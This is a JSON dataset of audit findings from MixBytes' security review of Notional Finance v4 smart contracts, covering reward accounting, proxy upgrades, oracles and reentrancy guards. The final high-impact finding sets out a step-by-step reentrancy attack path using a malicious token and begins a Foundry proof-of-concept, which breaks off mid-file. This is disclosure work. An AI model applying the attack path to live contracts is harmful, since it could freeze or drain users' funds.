{
  "category": "Insurance",
  "total_findings": 303,
  "fetched_at": "2026-01-29T12:57:39Z",
  "findings": [
    {
      "id": "63540",
      "title": "Mapping Key Order Inconsistency",
      "impact": "LOW",
      "content": "##### Description\nThe `AbstractRewardManager._getAccountRewardDebtSlot()` function declares a nested mapping with order `account -> rewardToken`, but the actual usage throughout the codebase accesses it as `[rewardToken][account]`. This inconsistency between declaration and usage can lead to confusion and potential storage layout issues if the declaration is changed to match the intended usage pattern.\n\n##### Recommendation\nWe recommend aligning the mapping declaration with its actual usage pattern. Either update the function signature to reflect the actual access pattern `mapping(address rewardToken => mapping(address account => uint256 rewardDebt))` or modify all usage sites to match the declared order. Since changing the access pattern would break existing storage layout, the safer approach is to update the function declaration to match the current usage.\n\n> **Client's Commentary:**\n> https://github.com/notional-finance/notional-v4/pull/35/commits/57c66f4888712aab5cad33874bb832ee7e54a2d2\n\n---\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#12-mapping-key-order-inconsistency",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63539",
      "title": "Hardcoded Storage Slots Instead of Hash-Based Approach",
      "impact": "LOW",
      "content": "##### Description\nThe storage slot constants in `AbstractRewardManager` use hardcoded integer values (1000001, 1000002, etc.) instead of hash-based generation. This approach is more prone to conflicts and less maintainable compared to using `keccak256` hashing with descriptive strings like `keccak256(\"notional.reward.pool\")`.\n\n##### Recommendation\nWe recommend using hash-based storage slot generation for better collision resistance and maintainability. Replace hardcoded constants like `uint256 private constant REWARD_POOL_SLOT = 1000001` with `bytes32 private constant REWARD_POOL_SLOT = keccak256(\"notional.reward.pool\")`. This approach provides better namespace isolation and reduces the risk of storage slot conflicts during upgrades or when integrating with other contracts.\n\n> **Client's Commentary:**\n> https://github.com/notional-finance/notional-v4/pull/35/commits/57c66f4888712aab5cad33874bb832ee7e54a2d2\n\n---\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#11-hardcoded-storage-slots-instead-of-hash-based-approach",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63538",
      "title": "Shared Pause/Unpause Role Creates Security Risk",
      "impact": "LOW",
      "content": "##### Description\nThe `pause()` and `unpause()` functions in `TimelockUpgradeableProxy` contract both use the same `pauseAdmin` role for authorization. However, unpausing is a more critical action than pausing as it restores full system functionality and should require higher privilege escalation. Currently, any account with pause permissions can also unpause the system, which reduces the effectiveness of emergency pause mechanisms.\n\n##### Recommendation\nWe recommend implementing a separate, more restricted role for unpause operations. This creates a proper security hierarchy where pausing (emergency response) can be executed quickly by operational admins, while unpausing (system restoration) requires approval from higher-privileged accounts. Consider implementing an `unpauseAdmin` role that is controlled by a multi-sig.\n\n> **Client's Commentary:**\n> https://github.com/notional-finance/notional-v4/pull/33\n\n---\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#10-shared-pauseunpause-role-creates-security-risk",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63537",
      "title": "Missing Event Emissions",
      "impact": "LOW",
      "content": "##### Description\nSeveral critical operations in the codebase currently lack event emissions, which reduces transparency and complicates monitoring:\n\nIn `AbstractYieldStrategy.sol`:\n- `collectFees()`\n\nIn `TimelockUpgradeableProxy.sol`: \n- `pause()`\n- `unpause()`\n- `whitelistSelectors()`\n\nIn `AbstractWithdrawRequestManager.sol`: \n- `finalizeAndRedeemWithdrawRequest()`\n- `finalizeRequestManual()`\n\n##### Recommendation\nWe recommend implementing comprehensive event emission for all critical operations to improve transparency and enable better monitoring/debugging. \n\n> **Client's Commentary:**\n> https://github.com/notional-finance/notional-v4/pull/35/commits/36e06747cee543ed97d5a9cbac80cb3fe717c543\n\n---\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#9-missing-event-emissions",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63536",
      "title": "Typos",
      "impact": "LOW",
      "content": "##### Description\nSeveral typos, misspellings, and inconsistent naming patterns were identified across the codebase.\n\n```\n- `src/interfaces/Curve/ICurve.sol`:  \n    `recieve` — Correction: `receive`  \n- `src/rewards/AbstractRewardManager.sol`:  \n    Comment text — Should be \"we're reclaiming\" or \"we are reclaiming\"  \n- `src/oracles/AbstractCustomOracle.sol`:  \n    SPDX identifier `BSUL-1.1` — Should be `BUSL-1.1`  \n- `src/oracles/PendlePTOracle.sol`:  \n    SPDX identifier `BSUL-1.1` — Should be `BUSL-1.1`  \n- `src/withdraws/ClonedCooldownHolder.sol`:  \n    Case sensitivity issue: filename vs contract name — Correction:  \n    Filename is `ClonedCooldownHolder.sol` (lowercase 'd'),  \n    but contract/imports use `ClonedCoolDownHolder` (uppercase 'D')  \n- `src/withdraws/AbstractWithdrawRequestManager.sol`:  \n    Inconsistent naming — `Cooldown` vs `CoolDown` - needs consistent casing\n```\n\n##### Recommendation\nWe recommend fixing all identified typos and naming inconsistencies to maintain professional code quality, paying special attention to SPDX license identifiers as they affect legal compliance, and establishing consistent naming conventions across the codebase to avoid confusion.\n\n> **Client's Commentary:**\n> https://github.com/notional-finance/notional-v4/pull/35/commits/8b5f6324afca52b1647875eb46abf33f66aace92\n\n---\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#8-typos",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63535",
      "title": "Unused and Duplicate Imports",
      "impact": "LOW",
      "content": "##### Description\nSeveral imports are declared in the codebase but never actually used:\n```\n- src/interfaces/ISingleSidedLP.sol — Trade  \n- src/interfaces/IYieldStrategy.sol — MarketParams  \n- src/interfaces/IYieldStrategy.sol — IMorphoLiquidateCallback, \n    IMorphoFlashLoanCallback  \n- src/single-sided-lp/AbstractSingleSidedLP.sol — AbstractYieldStrategy  \n- src/single-sided-lp/AbstractSingleSidedLP.sol — TokenizedWithdrawRequest  \n- src/staking/AbstractStakingStrategy.sol — WithdrawRequestNotFinalized  \n- src/staking/AbstractStakingStrategy.sol — ADDRESS_REGISTRY  \n- src/staking/AbstractStakingStrategy.sol — TRADING_MODULE  \n- src/staking/StakingStrategy.sol — IWithdrawRequestManager  \n- src/staking/StakingStrategy.sol — weETH, WETH, LiquidityPool, eETH  \n- src/withdraws/AbstractWithdrawRequestManager.sol — TradeFailed  \n- src/AbstractYieldStrategy.sol — IOracle  \n- src/AbstractYieldStrategy.sol — TradeFailed  \n- src/AbstractYieldStrategy.sol — ILendingRouter  \n- src/withdraws/GenericERC20.sol — ERC20  \n- src/routers/MorphoLendingRouter.sol — ILendingRouter  \n- src/oracles/PendlePTOracle.sol — IPOracle  \n```\nSame import included multiple times unnecessarily:\n\n```\n- src/AbstractYieldStrategy.sol — ADDRESS_REGISTRY (imported on line 8)  \n- src/routers/AbstractLendingRouter.sol — ILendingRouter (imported on line 4)\n```\n\n##### Recommendation\nWe recommend removing all unused imports to improve code clarity and reduce compilation overhead. For duplicate imports, we recommend keeping only the first occurrence and removing subsequent duplicates. This will help maintain cleaner code and prevent potential confusion during development.\n\n> **Client's Commentary:**\n> https://github.com/notional-finance/notional-v4/pull/35/commits/11ab88c71c67f48715fd76c8ba6a5b5667a9c760\n\n---\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#7-unused-and-duplicate-imports",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63534",
      "title": "`AddressRegistry` Constant Points to Non-Contract Address on Mainnet",
      "impact": "LOW",
      "content": "##### Description\nThe `Constants.sol` file defines a global constant:\n```solidity\nAddressRegistry constant ADDRESS_REGISTRY =\n    AddressRegistry(0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f);\n```\n\nOn the Ethereum mainnet, this address is not a deployed contract. It is simply the deterministic address produced by Foundry when a contract is created from the test account `makeAddr(\"deployer\")` with nonce == 1.\n\nMany core contracts dereference the constant for permission checks and fee routing, for example:\n\n1. `AbstractYieldStrategy.collectFees()` – forwards fees to `ADDRESS_REGISTRY.feeReceiver()`.\n2. Modifiers such as `onlyLendingRouter` – call `ADDRESS_REGISTRY.isLendingRouter(msg.sender)` to enforce access control.\n\n##### Recommendation\nWe recommend using a dynamically set `AddressRegistry` address obtained from the deployed contract via a getter, instead of hard-coding it as a constant.\n\n> **Client's Commentary:**\n> This was just in place for testing. We have changed the address after deployment.\n\n---\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#6-addressregistry-constant-points-to-non-contract-address-on-mainnet",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63533",
      "title": "Collateral Value Slightly Overestimated Before Cooldown Is Finalized in `DineroWithdrawRequestManager`",
      "impact": "LOW",
      "content": "##### Description\nWhen a withdraw request is initiated from a `DineroWithdrawRequestManager` vault that holds `apxETH`, the strategy first redeems the deposited `apxETH` to `pxETH` and then starts a Pirex cooldown, which then mints `upxETH`. Both redemptions might reduce the original `apxETH` amount due to fees.\n\nAs a result, until the request is finalized, the helper `getWithdrawRequestValue()` estimates collateral as `yieldTokenAmount` multiplied by `yieldToken price` (apxETH), while the contract actually holds a slightly smaller amount of `upxETH`. The collateral value shown in health-factor calculations is therefore overstated by the same small percentage until finalization.\n\nGiven the current fee levels, the difference is economically insignificant and cannot be exploited. Nevertheless, the bookkeeping is inconsistent, and the overvaluation would scale proportionally if Pirex were to increase its redemption fees in the future.\n\n##### Recommendation\nWe recommend storing the **net** amount that remains after the `PirexETH.initiateRedemption()` call in the request.\n\n> **Client's Commentary:**\n> https://github.com/notional-finance/notional-v4/pull/35/commits/5d131a6d437997c991d0cb7889e33650366898bf\n\n---\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#5-collateral-value-slightly-overestimated-before-cooldown-is-finalized-in-dinerowithdrawrequestmanager",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63532",
      "title": "Rewards Can Remain Stranded During Reward-Pool Migration When `forceClaimAfter` Gate Blocks the Claim",
      "impact": "LOW",
      "content": "##### Description\n`AbstractRewardManager.migrateRewardPool()` first tries to harvest any outstanding rewards via\n`AbstractRewardManager._claimVaultRewards()`. That helper is protected by the `forceClaimAfter` cooldown:\n\n```solidity\nif (block.timestamp <\n    rewardPool.lastClaimTimestamp + rewardPool.forceClaimAfter)\n    return;\n```\n\nIf the cooldown has not yet elapsed, `_claimVaultRewards()` returns early. The subsequent `_withdrawFromPreviousRewardPool()` call withdraws the LP tokens and automatically claims any pending rewards from the old pool, however those tokens arrive **after** the accounting step.\n\nAs a result the balances held by the strategy are never added to `accumulatedRewardPerVaultShare`, so users cannot claim them until governance adds the token as a secondary reward. This is true even when the new reward pool uses the same reward tokens, because the per-share index was snapshotted **before** the transfer and therefore never includes them.\n\nThe rewards are not lost, but they remain stranded and unusable by vault-share holders.\n\n##### Recommendation\nWe recommend bypassing the `forceClaimAfter` check during migration so that the accounting always includes the freshly transferred rewards.\n\n> **Client's Commentary:**\n> https://github.com/notional-finance/notional-v4/pull/35/commits/5d131a6d437997c991d0cb7889e33650366898bf\n\n---\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#4-rewards-can-remain-stranded-during-reward-pool-migration-when-forceclaimafter-gate-blocks-the-claim",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63531",
      "title": "`TimelockUpgradeableProxy.executeUpgrade()` Does Not Clear Upgrade State",
      "impact": "LOW",
      "content": "##### Description\nAfter a successful upgrade in `TimelockUpgradeableProxy.executeUpgrade()`, the storage variables `newImplementation` and `upgradeValidAt` are not cleared. This means that the upgrade state remains set, and subsequent calls to `executeUpgrade()` will still use the previous upgrade parameters. While this does not pose a direct security risk, it may lead to inconsistent upgrade logic or unexpected behavior if the function is called again.\n\n```solidity\nfunction executeUpgrade(bytes calldata data) external {\n    if (msg.sender != ADDRESS_REGISTRY.upgradeAdmin())\n        revert Unauthorized(msg.sender);\n    if (block.timestamp < upgradeValidAt) \n        revert InvalidUpgrade();\n    if (newImplementation == address(0)) \n        revert InvalidUpgrade();\n    \n    ERC1967Utils.upgradeToAndCall(newImplementation, data);\n}\n```\n\n##### Recommendation\nWe recommend clearing `newImplementation` and `upgradeValidAt` variables after a successful upgrade.\n\n> **Client's Commentary:**\n> https://github.com/notional-finance/notional-v4/pull/35/commits/f455dfa549987be197e08b4f554ae46ce2f0cb96\n\n---\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#3-timelockupgradeableproxyexecuteupgrade-does-not-clear-upgrade-state",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63530",
      "title": "`_flashBorrowAndEnter()` Return Values Are Unused in Event Emission",
      "impact": "LOW",
      "content": "##### Description\nThe `AbstractLendingRouter._flashBorrowAndEnter()` function returns `borrowShares` and `vaultSharesReceived` values that are used in the `PositionEntered` event. However, in the `AbstractLendingRouter._enterPosition()` function, these return values are ignored and the event is emitted with zero values instead of the actual returned values. This results in incorrect event data being emitted, which can mislead off-chain systems and users monitoring the protocol.\n\n```solidity\nif (borrowAmount > 0) {\n    _flashBorrowAndEnter( \n        onBehalf,\n        vault,\n        asset, \n        depositAssetAmount,\n        borrowAmount,\n        depositData,\n        migrateFrom\n    );\n```\n\n##### Recommendation\nWe recommend using the return values from the `_flashBorrowAndEnter` functions and using them in the `EnterPosition` event.\n\n> **Client's Commentary:**\n> Fixed in this commit:\nhttps://github.com/notional-finance/notional-v4/commit/a809036c2543ba434309374de715a8173b7bf39a\n\n---\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#2-_flashborrowandenter-return-values-are-unused-in-event-emission",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63529",
      "title": "Liquidations May Fail Due to Underflow in `CurveConvexLib.checkReentrancyContext()`",
      "impact": "LOW",
      "content": "##### Description\n`CurveConvexLib.checkReentrancyContext()` is called during liquidations to check whether the reentrancy flag in Curve pools is enabled. For pools flagged as `CurveInterface.V2`, the function calls:\n\n```solidity\nICurve2TokenPoolV2(CURVE_POOL).remove_liquidity(\n    1,\n    minAmounts,\n    true,\n    address(this)\n);\n```\n\nThis call burns 1 wei of LP tokens from the `CurveConvexLib` contract. However, in the normal case the contract shouldn't hold any LP tokens, so the burn fails with an underflow and `checkReentrancyContext()` reverts. \n\nSince this function is executed inside `AbstractSingleSidedLP._preLiquidation()`, any liquidation attempt in this strategy will revert.\n\nMoreover, even if the admin supplies LP tokens to the contract to avoid underflow, any user can call this function and burn those tokens, meaning the mitigation would not be effective.\n\n##### Recommendation\nWe recommend using a different approach to check whether the state is in a reentrancy context or not. \n\n> **Client's Commentary:**\n> https://github.com/notional-finance/notional-v4/pull/37\n\n---\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#1-liquidations-may-fail-due-to-underflow-in-curveconvexlibcheckreentrancycontext",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63528",
      "title": "Nested `nonReentrant` in Allocation Wrappers Causes Revert",
      "impact": "MEDIUM",
      "content": "##### Description\n`MorphoLendingRouter.allocateAndEnterPosition()` and `allocateAndMigratePosition()` are marked `nonReentrant` and internally call `enterPosition()` and `migratePosition()` which are also marked `nonReentrant` in `AbstractLendingRouter`. Because the project uses `ReentrancyGuardTransient`, this nested invocation re-enters the guard and reverts, rendering these allocation wrappers unusable in practice.\n\n```solidity\n// MorphoLendingRouter.sol\nfunction allocateAndEnterPosition(\n    ...\n) external payable isAuthorized(...) nonReentrant {\n    _allocate(vault, allocationData);\n    enterPosition(\n        onBehalf,\n        vault,\n        depositAssetAmount,\n        borrowAmount,\n        depositData\n    );\n}\n\nfunction allocateAndMigratePosition(\n    ...\n) external payable isAuthorized(...) nonReentrant {\n    _allocate(vault, allocationData);\n    migratePosition(\n        onBehalf,\n        vault,\n        migrateFrom\n    );\n}\n```\n\n##### Recommendation\nWe recommend calling the internal helper `\\_enterPosition(...)` directly from the allocation wrappers (and compute `borrowAmount` for migration locally via `ILendingRouter(migrateFrom).healthFactor(...)`), so only the outermost entry point carries the `nonReentrant` guard.\n\n> **Client's Commentary:** \n> Fixed in this commit: https://github.com/notional-finance/notional-v4/pull/43/commits/657f7240b708b72d00f9ee3b569e1559d33d71e6\n\n---\n",
      "summary": "\nThe bug report discusses an issue with two functions, `allocateAndEnterPosition()` and `allocateAndMigratePosition()`, in the `MorphoLendingRouter` contract. These functions are marked as `nonReentrant`, which means they can only be called once at a time. However, they internally call other functions, `enterPosition()` and `migratePosition()`, which are also marked as `nonReentrant` in the `AbstractLendingRouter` contract. This causes a problem because the project uses `ReentrancyGuardTransient`, which prevents functions from being called multiple times, and the nested invocation causes the guard to be re-entered and the transaction to fail. \n\nThe recommendation is to call the internal helper function, `_enterPosition()`, directly from the allocation wrappers and to compute the `borrowAmount` for migration locally using the `healthFactor()` function from the `ILendingRouter` interface. This will ensure that only the outermost entry point carries the `nonReentrant` guard and the functions can be used without any issues. The bug has been fixed in a recent commit and the issue should no longer occur.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#3-nested-nonreentrant-in-allocation-wrappers-causes-revert",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63527",
      "title": "Small LP Position Withdraws May Cause `price()` Revert",
      "impact": "MEDIUM",
      "content": "##### Description\nWhen `BaseLPLib.initiateWithdraw()` is called and a user has a very small LP position, the proportional exit \nfrom the Curve/Convex pool can return `exitBalances[i] == 0` for one of the two tokens (due to integer division and token decimals).\n\nA withdraw request in `initiateWithdraw()` is therefore created only for the token with a non-zero balance\n\n```solidity\nif (exitBalances[i] == 0) continue;\n```\n\nWhen the request exists, valuation switches to `BaseLPLib.getWithdrawRequestValue()`, which iterates over all pool tokens and executes `require(hasRequest)` for each. Because one token lacks a request, the call reverts.\n\nAs `getWithdrawRequestValue()` is called during `AbstractYieldStrategy.price()` execution, any functions that rely on it will revert for the affected account.\n\n##### Recommendation\nWe recommend checking whether a withdraw request has been created first and then using its value in `BaseLPLib.getWithdrawRequestValue()`.\n\n> **Client's Commentary:**\n> Based on our evaluation it does not seem possible to attain a zero balance due to the structure of the liquidity Curve. Regardless, we now revert on a zero exit balance in initiateWithdraw for singleSidedLp vaults anyway so this should moot the whole issue\n",
      "summary": "\nThe report describes a bug in the `BaseLPLib.initiateWithdraw()` function that can cause a user's withdrawal request to fail if they have a very small LP position. This happens because of a calculation error that results in one of the tokens having a balance of 0. The bug is caused by the `BaseLPLib.getWithdrawRequestValue()` function, which does not check for the existence of a withdrawal request before trying to use its value. The report recommends fixing this issue by checking for the existence of a withdrawal request first before using its value. The client has stated that they have already implemented a solution to this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#2-small-lp-position-withdraws-may-cause-price-revert",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63526",
      "title": "Pendle PT Oracle Ignores Losses During SY Redemptions, Leading to Over-Valued Collateral",
      "impact": "MEDIUM",
      "content": "##### Description\n`PendlePTLib.redeemExpiredPT()` forwards `0` as `minTokenOut` when calling `SY.redeem()`. For SY tokens whose redemption path performs swaps or charges fees, the real amount of underlying received can be materially lower than `SY.exchangeRate()` suggests.\n\nExamples:\n* `apxETH` may apply a redemption fee.\n* LP-backed SY tokens may suffer several % slippage when exiting the pool.\n\nBecause `PendlePTOracle` prices PT as `PT-to-SY TWAP rate multiplied by SY.exchangeRate()` it **ignores** those losses, so the strategy can over-state the USD value of PT collateral.\n\nPotential consequences\n1. A borrower opens what appears to be a healthy 90 %-LTV position, but the real collateral is smaller.\n2. At PT expiry the strategy calls `SY.redeem()`. If redemption realises, for example, 10 % slippage, the collateral value falls to the level of (or below) the outstanding debt.\n3. Liquidators receive little or no surplus collateral, making liquidation economically unattractive, which allows the position to remain under-collateralised.\n4. With larger losses the debt exceeds collateral, producing bad debt in the Morpho market.\n\n##### Recommendation\nWe recommend making risk parameters (LLTV, liquidation bonus) sufficiently conservative to absorb the worst-case redemption loss.\n\n> **Client's Commentary:**\n> This is an issue that will be managed through proper parameter choices, not code.\n> All SY tokens give you the option to redeem to a matching token (i.e. rsETH SY -> rsETH). If redeeming to the matching token, there will not be a fee or a trade and setting minTokenOut to 0 is fine.\n> So we'll just make sure to always redeem to the matching token and double check the SY's redemption function.\n> The issue of apxETH redemption fees is distinct from SY redemption. Proper apxETH redemption fee handling could be done on the Dinero wrm.\n\n---\n",
      "summary": "\nThe report highlights a bug in the code where the function `PendlePTLib.redeemExpiredPT()` forwards `0` as `minTokenOut` when calling `SY.redeem()`. This can result in a lower amount of underlying tokens being received compared to what is suggested by `SY.exchangeRate()`. This can lead to potential consequences such as underestimating the collateral value and making liquidation economically unattractive. The recommendation is to make risk parameters conservative to account for potential losses. The client suggests redeeming to a matching token to avoid fees and checking the redemption function for any issues. The issue of redemption fees for apxETH can be handled separately.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#1-pendle-pt-oracle-ignores-losses-during-sy-redemptions-leading-to-over-valued-collateral",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63525",
      "title": "Inability to Claim Rewards From the Curve Gauge",
      "impact": "HIGH",
      "content": "##### Description\nThe `CurveConvex2Token._unstakeLpTokens()` function calls `ICurveGauge(CURVE_GAUGE).withdraw(poolClaim)`, which takes only the `poolClaim` parameter. However, the Curve gauge `withdraw()` function supports an optional `_claim_rewards` flag, which allows claiming rewards during the withdraw call:\n\n```python\n@external\n@nonreentrant('lock')\ndef withdraw(_value: uint256, _claim_rewards: bool = False):\n```\n\nAs implemented, the strategy does not claim rewards when withdrawing from the gauge, so users do not automatically receive accrued rewards when exiting positions.\n\n```solidity\nfunction _unstakeLpTokens(uint256 poolClaim) internal {\n    if (CONVEX_REWARD_POOL != address(0)) {\n        bool success = IConvexRewardPool(CONVEX_REWARD_POOL).\n            withdrawAndUnwrap(poolClaim, false);\n        require(success);\n    } else {\n        ICurveGauge(CURVE_GAUGE).withdraw(poolClaim);\n    }\n}\n```\n\nAlthough `withdrawAndUnwrap()` also does not claim rewards on unstakes for Convex, Convex strategies are wired to the `ConvexRewardManager` contract that later claims and distributes rewards to users. In contrast, pure Curve gauge strategies do not have such a manager configured, therefore, users cannot claim gauge rewards and lose a material portion of APR.\n\nThis issue is classified as **High** severity because users lose accrued rewards and effective yield is reduced.\n\n##### Recommendation\nWe recommend creating a reward manager for the Curve gauge that handles rewards claiming and distributing CRV via the standard reward distribution mechanism.\n\n> **Client's Commentary:**\n> Fixed in this PR: https://github.com/notional-finance/notional-v4/pull/28\n\n---\n",
      "summary": "\nThe report highlights a bug in the CurveConvex2Token._unstakeLpTokens() function, where users are not able to claim rewards when withdrawing from the Curve gauge. This is because the function does not include the _claim_rewards flag, which is needed to claim rewards during the withdraw call. This results in users losing accrued rewards and reduces the effective yield. The recommendation is to create a reward manager for the Curve gauge to handle rewards claiming and distributing CRV through the standard reward distribution mechanism. The issue has been fixed in a recent pull request.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "MixBytes",
      "protocol_name": "Notional Finance",
      "source_link": "https://github.com/mixbytes/audits_public/blob/master/Notional%20Finance/Notional%20v4/README.md#1-inability-to-claim-rewards-from-the-curve-gauge",
      "github_link": "",
      "tags": [],
      "finders": [
        "MixBytes"
      ]
    },
    {
      "id": "63524",
      "title": "`redeemNative()` Reentrancy Enables Permanent Fund Freeze, Systemic Misaccounting, and Liquidation Cascades",
      "impact": "HIGH",
      "content": "##### Description\nThe redemption flow in `AbstractYieldStrategy.redeemNative()` is vulnerable to reentrancy that corrupts internal accounting and can permanently freeze a portion of the vault's yield tokens. The `redeemNative()` function calls `AbstractStakingStrategy._redeemShares()`, which for instant redemption delegates to `AbstractYieldStrategy._executeTrade()` and performs an external call during redemption. Not all vault and router entry points are protected against reentrancy, which allows control to reenter from the lending router while `_burnShares()` is still executing. A malicious token placed on the swap path can exploit this by reentering and invoking `ILendingRouter.initiateWithdraw()` during the redemption.\n\nWhen reentrancy occurs, the request manager transfers an amount N of yield tokens from the vault. This decreases the vault's true yield token balance along with `s_yieldTokenBalance` while `_burnShares()` continues to run based on a pre‑reentrancy snapshot. After control returns, `_burnShares()` computes `yieldTokensRedeemed = yieldTokensBefore - yieldTokensAfter` and then subtracts this value from `s_yieldTokenBalance`. Since `yieldTokensBefore` was taken before the reentrancy and the request manager already moved N tokens, `s_yieldTokenBalance` is effectively reduced twice for N. The resulting difference causes yield tokens to become unaccounted by internal state and remain frozen in the vault. This also distorts share pricing and may reduce health factors enough to trigger liquidations, enabling repeated exploitation, potentially leading to full vault fund freezing.\n\nIt is also possible to trigger a similar reentrancy through `AbstractYieldStrategy.collectFees()`, since it reduces the vault's yield token balance and `s_yieldTokenBalance`. The impact is smaller because fee collection typically moves a limited amount of tokens, but the accounting discrepancy mechanism is analogous.\n\n**Attack Path:**\n\n1. The attacker deploys a malicious ERC20 token and creates Uniswap V2 pools to form a swap path `yieldToken -> maliciousToken -> asset`.\n2. The attacker enters a position via the lending router and gives approval to the malicious token to perform `initiateWithdraw` later on it.\n3. The attacker ensures they hold native shares without an open position by liquidating another account first, following the protocol’s constraints.\n4. The attacker calls `redeemNative` using the instant redemption path and sets `exchangeData` to the Uniswap V2 path that includes the malicious token.\n5. During the Uniswap V2 swap, the malicious token’s `transfer()` reenters and calls `ILendingRouter.initiateWithdraw(attacker, vault, ...)` while `_burnShares()` is still running.\n6. The Withdraw Request Manager transfers N yield tokens from the vault during reentrancy, decreasing the vault’s true yield token balance with `s_yieldTokenBalance` aswell.\n7. Control returns to `_burnShares()`, which computes `yieldTokensRedeemed` using the pre‑reentrancy snapshot and subtracts it from `s_yieldTokenBalance`. The result is an effective subtraction of M + 2N, leaving N yield tokens unaccounted by internal state and thus frozen.\n8. The mismatch between `ERC20(yieldToken).balanceOf(address(y))` and `s_yieldTokenBalance` becomes observable. Health factors can drop, triggering liquidations and enabling repeated exploitation.\n\nHere is the proof of concept that shows the attack:\n\nFirstly, put these lines into `MockStakingStrategy` contract:\n\n```solidity\n// Expose internal state for testing\nfunction _s_yieldTokenBalance() external view returns (uint256) {\n    return s_yieldTokenBalance;\n}\n```\n\nThen, put this file into `tests` folder and run it with `forge test --match-test test_reentrancy_redeemNative_initiateWithdraw_instant -vvv`:\n\n```solidity\n// SPDX-License-Identifier: UNLICENSED\npragma solidity >=0.8.29;\n\nimport \"forge-std/src/Test.sol\";\n\nimport \"./TestMorphoYieldStrategy.sol\";\nimport \"./TestWithdrawRequestImpl.sol\";\nimport \"../src/staking/AbstractStakingStrategy.sol\";\nimport \"../src/staking/StakingStrategy.sol\";\nimport \"../src/withdraws/EtherFi.sol\";\nimport \"../src/interfaces/ITradingModule.sol\";\nimport \"./TestStakingStrategy.sol\";\nimport \"./Mocks.sol\";\n\ncontract 